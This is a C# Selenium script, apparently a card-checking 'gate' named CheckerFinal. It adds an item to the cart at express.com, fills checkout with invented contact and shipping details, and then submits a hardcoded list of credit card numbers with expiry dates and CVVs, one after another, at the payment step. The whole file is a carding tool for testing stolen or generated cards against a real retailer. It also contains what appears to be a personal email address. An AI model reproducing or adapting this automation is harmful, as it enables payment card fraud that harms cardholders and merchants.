using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using OpenQA.Selenium.Support.UI;
using OpenQA.Selenium;
using OpenQA.Selenium.Opera;

namespace CheckerFinal
{
    public class gate1
    {

   


        public String[] migate1()
        {

            var chromeOptions = new ChromeOptions();
            chromeOptions.PageLoadStrategy = PageLoadStrategy.Eager;
            chromeOptions.AddUserProfilePreference("profile.default_content_setting_values.images", 2);
            // chromeOptions.AddArguments("headless");
            IWebDriver driver = new ChromeDriver(chromeOptions);

            try
            {




                driver.Url = "https://www.express.com/clothing/women/solid-satin-face-mask/pro/01164622/color/BEIGE/";
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("button[class='btn _9yfmt _194FD _2tFXQ _3yOD6 _1Qp1L _2veMA']")));
                driver.FindElement(By.CssSelector("button[class='btn _9yfmt _194FD _2tFXQ _3yOD6 _1Qp1L _2veMA']")).Click();
                driver.Url = "https://www.express.com/bag";
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("button#continue-to-checkout")));
                driver.FindElement(By.CssSelector("button#continue-to-checkout")).Click();
                driver.Url = "https://www.express.com/checkout/contact-information";
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("input[name='firstname']")));
                driver.FindElement(By.CssSelector("input[name='firstname']")).SendKeys("Christopher");
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("input[name='lastname']")));
                driver.FindElement(By.CssSelector("input[name='lastname']")).SendKeys("Jhonson");
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("input[name='email']")));
                driver.FindElement(By.CssSelector("input[name='email']")).SendKeys("br.ya.nvel.ez007@gmail.com");
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("input[name='confirmEmail']")));
                driver.FindElement(By.CssSelector("input[name='confirmEmail']")).SendKeys("br.ya.nvel.ez007@gmail.com");
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("input[name='phone']")));
                driver.FindElement(By.CssSelector("input[name='phone']")).SendKeys("3046541243");
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("button[type='submit']")));
                driver.FindElement(By.CssSelector("button[type='submit']")).Click();
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("button[type='submit']")));
                driver.FindElement(By.CssSelector("button[type='submit']")).Click();
                new WebDriverWait(driver, TimeSpan.FromSeconds(40000)).Until(ExpectedConditions.ElementExists(By.CssSelector("input[name='shipping.line1']")));
                driver.FindElement(By.CssSelector("input[name='shipping.line1']")).SendKeys("1700 Highway 210 Bypass");
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("input[name='shipping.postalCode']")));
                driver.FindElement(By.CssSelector("input[name='shipping.postalCode']")).SendKeys("36867");
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("input[name='shipping.city']")));
                driver.FindElement(By.CssSelector("input[name='shipping.city']")).SendKeys("Phenix City");
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("button[data-selected='false']")));
                driver.FindElement(By.CssSelector("button[data-selected='false'")).Click();
                new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("div.kI5FA button[data-selected='false']")));
                driver.FindElement(By.CssSelector("div.kI5FA button[data-selected='false']")).Click();


                String[] cardfinal = { "", "", "" };
                String[] allcards = { "4000222011344068|12|2022|494", "4000222011341361|12|2022|494", "4000222011341510|12|2022|494" };

                for (var x = 0; x < allcards.Length; x++)
                {
                    System.Diagnostics.Debug.WriteLine("dentro de for: " + x);
                    char delimitador = '|';
                    string[] valores = allcards[x].Split(delimitador);
                    String bin = valores[0];
                    String mounth = valores[1];
                    String year = valores[2];
                    String cvv = valores[3];
                    String cardpartial = fillCards(driver, bin, mounth, year, cvv);
                    cardfinal[x] = cardpartial;
                }







                // String[] cardCheck = fillCard(driver, allcards);



                //   var msj = driver.FindElement(By.CssSelector("div._2UTfO")).Text;
                // string[] res = { "421316", "red" };
                return cardfinal;

            }
            finally
            {
                //  driver.Quit();
            }





        }


        public String fillCards(IWebDriver driver, String Card, String mounth, String year, String cvv)
        {
            System.Diagnostics.Debug.WriteLine("dentro de fill");
            new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("input#creditCardNumberInput")));
            driver.FindElement(By.CssSelector("input#creditCardNumberInput")).Clear();
            driver.FindElement(By.CssSelector("input#creditCardNumberInput")).SendKeys(Card);
            new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("select[name='expMonth']")));
            driver.FindElement(By.CssSelector("select[name='expMonth']")).SendKeys("03");
            new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("select[name='expYear']")));
            driver.FindElement(By.CssSelector("select[name='expYear']")).SendKeys("23");
            new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("input[name='cvv']")));
            driver.FindElement(By.CssSelector("input[name='cvv']")).SendKeys("088");
            new WebDriverWait(driver, TimeSpan.FromSeconds(30000)).Until(ExpectedConditions.ElementExists(By.CssSelector("div._2BruY button")));
            driver.FindElement(By.CssSelector("div._2BruY button")).Click();



            return Card;
        }


    }
}
